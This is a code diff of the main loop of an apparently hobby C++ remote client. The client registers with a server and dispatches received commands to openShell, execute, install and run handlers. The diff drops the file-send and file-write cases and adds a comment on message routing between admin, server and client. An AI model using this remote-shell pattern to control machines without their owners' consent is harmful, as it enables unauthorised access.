@@ -9,7 +9,7 @@ options
 cmd2Enum( string& cmd )
 {
     options result=op_nop;
-    vector<string> cmds={"openShell","sendfile","writefile","execute","install","run", "isOK","nop"};
+    vector<string> cmds={"openShell","execute","install","run", "isOK","nop"};
 
     for(unsigned i=0;  i < cmds.size();i++ )
     {   
@@ -25,12 +25,21 @@ int
 main()
 {
     clientManager manager;
+    if (!manager.getRegisterMade()){
+        return 1;
+    }
+    
+    vector <string> cmd;
 
     while (1){
-        vector <string> cmd = manager.getComand();
-        options option=cmd2Enum(cmd[0]);
-        cmd.erase(cmd.begin());
-        //colocar cmd como comando a receber
+        string exec = manager.getComand();
+        options option=cmd2Enum(exec);
+        cmd = manager.getArgs();
+        
+        cout << "Execucao: "  << exec << endl;
+
+        for (unsigned i=0;i<cmd.size();i++)
+            cout << "comandos:" << cmd[i] << endl;
 
         switch (option)
         {
@@ -38,19 +47,9 @@ main()
             cout << "opening shell" << endl;
             manager.openShell(cmd);
             break;
-
-        case op_sendfile:
-            cout << "op_sendfile" << endl;
-            manager.sendfile(cmd);
-            break;
-        
-        case op_writefile:
-            cout << "op_writefile" << endl;
-            manager.writefile(cmd);
-            break;
         
         case op_execute:
-            cout << "op_execute" << endl;
+            cout << "op_execute" << cmd.size() << endl;
             manager.execute(cmd);
             break;
 
@@ -76,3 +75,18 @@ main()
 
     }
 }
+
+/*
+    1 : adm -> serv
+    2 : serv -> clt
+    3 : serv <- clt
+    4 : adm <- serv
+
+    5 : adm -> clt
+            adm -> serv
+            serv -> clt
+
+    6 : adm <- clt
+            serv <- clt
+            adm <- serv 
+*/
